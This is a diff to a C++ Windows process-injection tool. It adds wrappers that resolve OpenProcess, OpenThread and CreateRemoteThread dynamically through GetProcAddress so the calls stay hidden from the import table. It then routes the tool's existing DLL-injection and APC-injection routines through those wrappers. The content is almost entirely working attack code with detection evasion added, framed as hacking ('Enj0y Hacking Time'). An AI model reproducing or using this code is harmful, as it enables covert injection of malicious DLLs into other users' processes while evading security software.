@@ -3,9 +3,62 @@
 #include <cstring>
 #include<Windows.h>
 #include<Tlhelp32.h>
-#include <cctype> 
 using namespace std;
 
+HANDLE Hide_OpenThread(
+	_In_ DWORD dwDesiredAccess,
+	_In_ BOOL bInheritHandle,
+	_In_ DWORD dwThreadId
+)
+{
+typedef	HANDLE(WINAPI *Fn_OpenThread)(
+			_In_ DWORD dwDesiredAccess,
+			_In_ BOOL bInheritHandle,
+			_In_ DWORD dwThreadId
+		);
+	HMODULE OpenThreadHandle = GetModuleHandleW(L"Kernel32.dll");
+	Fn_OpenThread ptr = (Fn_OpenThread)GetProcAddress(OpenThreadHandle, "OpenThread");
+	return ptr(dwDesiredAccess,bInheritHandle,dwThreadId);
+}
+HANDLE  Hide_CreateRemoteThread(
+	_In_ HANDLE hProcess,
+	_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	_In_ SIZE_T dwStackSize,
+	_In_ LPTHREAD_START_ROUTINE lpStartAddress,
+	_In_opt_ LPVOID lpParameter,
+	_In_ DWORD dwCreationFlags,
+	_Out_opt_ LPDWORD lpThreadId
+)
+{
+	typedef	HANDLE(WINAPI* FN_CreateRemoteThread)(
+		_In_ HANDLE hProcess,
+		_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,
+		_In_ SIZE_T dwStackSize,
+		_In_ LPTHREAD_START_ROUTINE lpStartAddress,
+		_In_opt_ LPVOID lpParameter,
+		_In_ DWORD dwCreationFlags,
+		_Out_opt_ LPDWORD lpThreadId
+	);
+	HMODULE CreateRemoteThreadHandle = GetModuleHandleW(L"Kernel32.dll");
+	FN_CreateRemoteThread ptr = (FN_CreateRemoteThread)GetProcAddress(CreateRemoteThreadHandle, "CreateRemoteThread");	
+	return ptr(hProcess,lpThreadAttributes,dwStackSize,lpStartAddress,lpParameter,dwCreationFlags,lpThreadId);
+}
+
+HANDLE Hide_OpenProcess(
+	_In_ DWORD dwDesiredAccess,
+	_In_ BOOL bInheritHandle,
+	_In_ DWORD dwProcessId
+)
+{
+	typedef HANDLE (WINAPI *Fn_OpenProcess)(
+			_In_ DWORD dwDesiredAccess,
+			_In_ BOOL bInheritHandle,
+			_In_ DWORD dwProcessId
+		);
+	HMODULE OpenProcessHandle = GetModuleHandleW(L"Kernel32.dll");
+	Fn_OpenProcess ptr = (Fn_OpenProcess)GetProcAddress(OpenProcessHandle, "OpenProcess");
+	return ptr(dwDesiredAccess, bInheritHandle, dwProcessId);
+}
 DWORD Hide_QueueUserAPC(
 	_In_ PAPCFUNC pfnAPC,
 	_In_ HANDLE hThread,
@@ -106,7 +159,7 @@ DWORD GetProcessPID(LPCTSTR lpProcessName)
 void APCInject(DWORD pid, LPCWSTR dllpath)
 {
 	//1.获取句柄
-	HANDLE TargetHandle = OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
+	HANDLE TargetHandle = Hide_OpenProcess(PROCESS_ALL_ACCESS, NULL, pid);
 	if (TargetHandle == NULL)
 	{
 		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;
@@ -180,7 +233,7 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 		//判断目标线程的进程ID是否是我们要注入的进程的ID
 		if (te.th32OwnerProcessID == pid)
 		{
-			ThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);  //获取目标线程的句柄
+			ThreadHandle = Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);  //获取目标线程的句柄
 			if (ThreadHandle)
 			{
 				DWORD dwRet = Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);  //插入APC函数
@@ -196,7 +249,7 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 		{
 			if (te.th32OwnerProcessID == pid)
 			{
-				ThreadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+				ThreadHandle = Hide_OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
 				if (ThreadHandle)
 				{
 					DWORD dwRet = Hide_QueueUserAPC((PAPCFUNC)LoadLibraryAddress, ThreadHandle, (ULONG_PTR)RemoteMemory);
@@ -218,7 +271,7 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 		}
 		else
 		{
-			cout << "	[+] APC Inject Successfully :)" << endl;
+			cout << "	[+] APC Inj&ct Successfully !! Enj0y Hacking Time :) !" << endl;
 		}
 	}
 }
@@ -227,7 +280,7 @@ void APCInject(DWORD pid, LPCWSTR dllpath)
 void DLLInject(DWORD pid, LPCWSTR dllpath)
 {
 	//1.获取句柄
-	HANDLE OriginalProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+	HANDLE OriginalProcessHandle = Hide_OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
 	if (OriginalProcessHandle == NULL)
 	{
 		cout << "	[-] Get TargetProcessHandle Failed :(" << endl;
@@ -248,7 +301,7 @@ void DLLInject(DWORD pid, LPCWSTR dllpath)
 	DWORD  length = (wcslen(dllpath) + 1) * sizeof(TCHAR);
 
 	PVOID  RemoteMemory = Hide_VirtualAllocEx(OriginalProcessHandle, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READ);
-	
+
 	if (RemoteMemory == NULL)
 	{
 
@@ -311,7 +364,7 @@ void DLLInject(DWORD pid, LPCWSTR dllpath)
 		cout << "	[+] Get ZwCreateThreadEx Address Successfully :)" << endl;
 	}
 	//5.创建线程 ring3调用CreateRemoteThread
-	HANDLE RemoteHandle = CreateRemoteThread(OriginalProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, NULL);
+	HANDLE RemoteHandle = Hide_CreateRemoteThread(OriginalProcessHandle, NULL, 0, (LPTHREAD_START_ROUTINE)LoadLibraryHandle, RemoteMemory, 0, NULL);
 	if (RemoteHandle == NULL)
 	{
 		cout << "	[-] Ring3 Thread Inject Failed :(" << endl;
@@ -347,9 +400,8 @@ void DLLInject(DWORD pid, LPCWSTR dllpath)
 
 int _tmain(int argc, TCHAR* argv[])
 {
-
 	if (argc == 3) {
-
+		
 		cout << "	    Which kind of Injection do you want?" << endl;
 		cout << "	    [1]: DLLInject" << endl << "	    [2]: APCInject" << endl;
 		int type = 0;
